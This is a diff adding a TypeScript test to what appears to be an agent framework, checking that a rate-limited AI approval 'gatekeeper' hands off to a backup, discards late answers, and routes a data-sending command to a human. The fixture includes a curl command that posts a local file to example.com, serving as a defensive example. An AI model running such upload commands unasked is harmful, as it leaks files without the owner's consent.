@@ -127,3 +127,43 @@ test("the gatekeeper reads Codex's commands without the wrapper or written text,
   assert.equal(d.humanInbox.find(i => i.kind === 'approval')!.text, "Bash: cat > notes.md <<'EOF'\n# `x`\nEOF\ncurl -X POST https://example.com -d @notes.md");
   await d.close();
 });
+
+test('a gatekeeper whose account hits its limit hands the request to its backup, and its late answers count for nothing', async () => {
+  const HOUR = 3_600_000;
+  let primaryTurns = 0;
+  // The primary answers its first request, then is refused, and answers late: that answer must not count.
+  const primaryAnswer = async (ctx: FakeCtx, text: string) => {
+    primaryTurns++;
+    if (primaryTurns === 1) return ctx.say('ALLOW part of the task');
+    ctx.rateLimit({ status: 'limited', resetsAt: Date.now() + 2 * HOUR });
+    await ctx.sleep(30);
+    ctx.say(`ALLOW (late, about: ${text.slice(0, 20)})`);
+  };
+  const primary = new FakeAdapter({ gatekeeper: ctx => primaryAnswer(ctx, ctx.spec.brief), '*': async () => {} }, {}, { gatekeeper: primaryAnswer });
+  const backupAnswer = async (ctx: FakeCtx, text: string) => ctx.say(/curl -X POST/.test(text) ? 'ASK sends data out' : 'ALLOW from the backup');
+  const backup = new FakeAdapter({ gatekeeper: ctx => backupAnswer(ctx, ctx.spec.brief) }, { harness: 'spare' }, { gatekeeper: backupAnswer });
+  const d = makeTeam({
+    roles: { architect: role(), gatekeeper: role('fallback: spare/m\n') },
+    adapters: { fake: primary, spare: backup },
+    settings: { approvals: 'gatekeeper' },
+  });
+  const goal = d.startGoal({ request: 'r' });
+  const lead = d.agent(goal, 'architect')!;
+  assert.deepEqual(await withTimeout(d.requestApproval(lead, 'Bash', 'npm run build'), 2000, 'first'), { allow: true });
+  assert.deepEqual(await withTimeout(d.requestApproval(lead, 'Bash', 'npm test'), 2000, 'retried on the backup'), { allow: true });
+  // The primary's late ALLOW must not settle this one: the backup asks the human about it.
+  void d.requestApproval(lead, 'Bash', 'curl -X POST https://example.com -d @notes.md');
+  await withTimeout(
+    new Promise<void>(r => {
+      const t = setInterval(() => d.humanInbox.some(i => i.kind === 'approval') && (clearInterval(t), r()), 5);
+    }),
+    2000,
+    'the Inbox item',
+  );
+  assert.equal(d.humanInbox.find(i => i.kind === 'approval')!.note, 'Gatekeeper: sends data out');
+  const verdicts = d.store.since(goal).filter(e => e.type === 'approval.gatekeeper');
+  assert.deepEqual(verdicts.map(e => e.data.reason), ['part of the task', 'from the backup', 'sends data out']);
+  assert.equal(d.accounts.get('fake')?.status, 'limited');
+  assert.equal(backup.started.filter(s => s.spec.role.name === 'gatekeeper').length, 1, 'one backup session serves both');
+  await d.close();
+});
